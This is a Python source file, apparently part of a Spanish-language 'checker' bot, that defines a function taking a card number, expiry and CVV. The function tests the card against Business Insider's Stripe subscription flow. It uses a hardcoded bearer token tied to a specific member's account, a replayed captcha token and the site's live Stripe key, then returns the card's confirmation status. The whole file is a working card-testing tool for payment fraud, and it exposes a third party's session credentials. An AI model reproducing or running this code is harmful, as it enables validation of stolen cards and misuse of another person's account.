from all.configs._def_main_ import *

async def auth(cc, mes, ano, cvv):
    ssl_context = ssl.create_default_context(cafile=certifi.where())
    conn = aiohttp.TCPConnector(ssl=ssl_context)
    async with aiohttp.ClientSession(connector=conn) as session:

        headers = {
        'accept': '*/*',
        'accept-language': 'es-419,es;q=0.9',
        'authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJtZW1iZXJfaWQiOiI5ZGQ2NzY3Mi1iOTQ0LTQxMGUtYTFiMi0xYTU3OGJiZjhhOGMiLCJlbWFpbCI6ImpvcmdlYW50b25pb0BnbWFpbC5jb20iLCJpYXQiOjE3MTM1OTIzMjQsImV4cCI6MTcyMTM2ODMyNCwiYXVkIjoiQjZzSVhLTGlpbiIsImlzcyI6Imh0dHBzOi8vd3d3LmJ1c2luZXNzaW5zaWRlci5jb20iLCJqdGkiOiIzNzZkMjQ1MC1jNjVkLTQ5MTAtOWUyYy1hNDkyZGU4NDhjOTMifQ.VbOv_4F2pmSkzFt801xFnM-mlbT7kQGlxMqwjX3-ZHU',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://www.businessinsider.com',
        'pragma': 'no-cache',
        'referer': 'https://www.businessinsider.com/',
        'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    }

        params = {
        'type': 'consumer',
    }

        json_data = {
        'type': 'setup-intent',
        'paymentMethodType': 'auto',
    }

        async with session.post('https://membership-api.businessinsider.com/v1.0/users/9dd67672-b944-410e-a1b2-1a578bbf8a8c/intents', params=params, headers=headers, json=json_data) as response:
            data = await response.json()

            try:
                intent_id = data['data']['attributes']['intentId']
                intent_client_secret = data['data']['attributes']['intentClientSecret']
                print("intentId:", intent_id)
                print("intentClientSecret:", intent_client_secret)
            except KeyError:
                print("Error: Respuesta inesperada del servidor")

        headers = {
        'accept': 'application/json',
        'accept-language': 'es-419,es;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'pragma': 'no-cache',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    }

        data = f'return_url=https%3A%2F%2Fwww.businessinsider.com%2Fsubscription%3FIR%3DC&payment_method_data[billing_details][address][postal_code]=10080&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][line1]=&payment_method_data[billing_details][address][line2]=&payment_method_data[billing_details][address][city]=&payment_method_data[billing_details][address][state]=&payment_method_data[type]=card&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_year]={ano}&payment_method_data[card][exp_month]={mes}&payment_method_data[allow_redisplay]=unspecified&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F9e321c785d%3B+stripe-js-v3%2F9e321c785d%3B+payment-element%3B+deferred-intent%3B+autopm&payment_method_data[referrer]=https%3A%2F%2Fwww.businessinsider.com&payment_method_data[time_on_page]=45177&payment_method_data[client_attribution_metadata][client_session_id]=127a0976-da88-40a9-b557-0bf383cfbdf7&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=payment-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2021&payment_method_data[client_attribution_metadata][payment_intent_creation_flow]=deferred&payment_method_data[client_attribution_metadata][payment_method_selection_flow]=automatic&payment_method_data[guid]=e63528b0-5980-4bd6-b105-f41d781d5a76e6f6a1&payment_method_data[muid]=8e807cdc-297e-404a-974c-7aa27c22e91c0d8a7e&payment_method_data[sid]=e0a8eb4c-aa26-48e5-a286-07720cb83d1061377a&expected_payment_method_type=card&client_context[currency]=usd&client_context[mode]=setup&client_context[setup_future_usage]=off_session&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQaSprIAKxFaq8lXl2eHYCpkH01w7qek4Cn4IqgD5EUr1PXVNVbUCCpn-XbEi_qczeV6rjbz3ontyl3jyZY5KHDKvAqq2ZYzFvPc2_dpcI1aQBp9IhCWAcQTGGOJYzFK6PLEhXnw8rWxK77-MeSutryqkjwQCoRCGOEJu2On9gN2pKsd0zOcRTzvZesXEv1CYt_SvgHdQg_uBjeOD-aAuoNgj5LhEyCfCnurGTNWgkMiu5bcBn32oMzMF-LEJEFRabGZrtxbg_4znhlauxnAJ6pQ6vngUHxFlX5t4_ohwNuY-5Q7QiDeGu1ptG9A5-3c4tqJJNwXNIHQhUI7KnyTSdUCtYQgOPwhvcl2eEakaaheoZ7_xn_22cB3I5S0XhGSX8XqsXgILVPL5p80a3clO-4jnR4fR4etCe05zaXTiGQjRgB-WHOQhRvYY3_zl37j-EbkzT3VMiupZgAYOWTt-BEuydKs74dUs2vyun5mpQbj6C3IF5IZP03BDbBOiqgF1Vug5221VRmXqelxGoxtVdzM2rm55MEj4w8LZom6SDPtanscKCVOB5UHRQZU1lqIKD7Kqm1kgGyh-UYVZpXchzfKu62zgVsosLORpegQjq1lN2e3GfP1CWgc9snH9kmv36hX-vS-gSC8J94brpGr9uOMIz0HQFYLzesYOk77v7bdYRcdiJHSzGCmL4_jQ2hKQz74KKVpTfrNRqA5nqP1iSe5I9F5jzc8JzOAUiyVtzzVXo2g0WjA0C3qblUXqp6nNfQKRzmKbjsAh4kLJzIw3l2Os3Ppj90Gmgf9_y8SQqmocKIK7_Jh9-GDN9CBh7aLVLgViXjA60c4Jgmkshemn2tJZThl898G1uS20GMOMi45cL-92Q3AmEWhXbXd9s1ZNYcTMYhpJCnUwe98OTG-YviPxrisgbdDUOUvgw7qiy39TcUNfb_qchmkPV9KU3gPeO8Wu6KsxqzjK8YrRP9ItCAys4a1Ug76p8f4vh1i6re_wvfAosFZSW4WOvPP1EzSo5AuhXEv9OINu4S1wd3-YpI33_jTuRGprCGeK-RbfsXJ-eY7i1Z062rZBr3wIAGj69WVOcJIxdG-gxDDmhT2zA46A3DdDLYbfcd3UlmjNjz6Y86XECCg2cAZYR5WoXBDfTkUVcHQCe4GcYOZKHdIKSSlpK89AwxKqB-oUCJMRfzIYSVqw7LsgCHVF6QFKT0rkqidJLCZD6kHgoDBNT_ZTjufeMBTVT5xgOPCrfdpeNSdIVBUs6JMzu3_Pm_EY7AUUTyv1OI3Nrewe7uxvC9pPCymOQbMTMI5OmLN_evWe7FuXU-HJr0SLS70YN0CW4RgQce4WkioAFhhGNRokaozh6YQARJeZ-xAy5VQmUqv_7A-kYjfhUdRrnrR0LeB6BMkIXYZ18yb2iAktoCO7qbLdi5t9_nCRNMkQwQ2xuGbgbDYOyuGdn_yQPIaIijclGi3IeDHQ4vXDrAp9iTZa3P2BdpaQ79EnmEGqVxRR6QxCy0cvgFye_P8Sr_OGJNREr23WG7LP-Ni6DN3ec12i8YeaVJhye4HMRX2_mYkZDNl4dnRQn-RUBIOZa84a0J-6x78BpGRy0Wm16HYpEFMd5FOhUxfB-5qJQvvg9XTIU3CVPsvyWr1rBOBA1kGjWyFsOoG4jo8kUN0EIG0RRiulpR_w0cN7xY7Stlr6SIefqw7rK0a0tjFu5Fz2OqB0X5tYyAL9Kl-xKLQXPfxqlBLllruaAEjKZYJ6S1gdYmwn4fuKvpWsQpgU425LR3vs1X8UAaU-o-8v3eCkPRK_OgKhZEgJQ3MJpAcZRBvvPo8S1cFrAsoqIFXHJ41d-qb2sFMxwzGyx4-He63CIpzK4JSU118B72bsyJ2Mzd2-mUCDr9lFR3UMawEiy4GxlFwjxmedn03_axoV2JwulIXr6v7RIPfyAUhAH-U6iw-5JwxvwU2Y-3wfyAYO11wBIeWyyLkqENKeEhEIoLUyfHo16pMeZIQ2MK_8wY1-SKlKdA_8_FBd6b6801ZjMbLd3f6NNb0uhVZSMNIpkZmi-oZP1YBMSEw4q3qqcxHCNc3DrOKURRpb6EssjvUKjwI8DmqWJM6A3xweqUPOMrKOg097SiANdv_BKvdqm7nSZorIguoavHbp04HaDUsy19hiR7qZpEABiOhBvnFw3AImezNMvoCrwonbwUeRrM6wsR732-rU2fX_hEPSumH4C1QTMg9jLquxReYGr_Pr0CjZXhwzmYjWH6oc2hhcmRfaWTODTtkKaJrcqgzMTVkNDUxZqJwZAA.2b4Z6JX4Q4r7OPeta5D7JSoNywznTnDOv_Qf0SYyWY0&use_stripe_sdk=true&key=pk_live_51JHVEjH1ioaynmTdQFNMdZyLI2mekX6TqSB4m6q6uhgMY8l2nzYdmQppBWzp8tW11p92CV7MtlT1h6qav5hNrRJR00nEZ7txk7&client_secret={intent_client_secret}'


        async with session.post(f'https://api.stripe.com/v1/setup_intents/{intent_id}/confirm', headers=headers, data=data) as response:
            r5 = await response.json()

            try:
                status = r5['status']
                return status
            except KeyError:
                error = r5['error']['message']
                return error


